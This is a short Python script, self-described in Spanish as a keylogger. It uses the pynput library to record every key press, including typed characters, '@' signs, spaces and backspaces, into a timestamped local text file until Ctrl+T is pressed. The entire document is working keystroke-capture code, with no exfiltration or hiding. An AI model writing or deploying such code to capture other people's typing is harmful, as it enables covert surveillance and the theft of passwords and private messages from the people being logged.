import datetime
from pynput.keyboard import Listener


def key_listener():
    print('inicio')

    d = datetime.datetime.now().strftime("%Y-%m-%d_%H-%M-%S")

    file_name = 'Kajiwara_{}.txt'.format(d)

    f = open(file_name, 'w')
    def key_recorder(key):
        key = str(key)
        if key == 'Key.enter':
            f.write('\n')
        elif key == 'Key.space':
            f.write(key.replace('Key.space', ' '))
        elif key == 'Key.backspace':
            f.write(key.replace("Key.backspace", "%BORRAR%"))
        elif key == '<65027>':
            f.write('%ARROBA%')
        elif key == "'\\x14'":
            f.write('\n\nSaliendo del keylogger . . .')
            f.close()
            quit()
        else:
            f.write(key.replace("'", ""))

       
    with Listener(on_press=key_recorder) as listener:
        listener.join()

key_listener()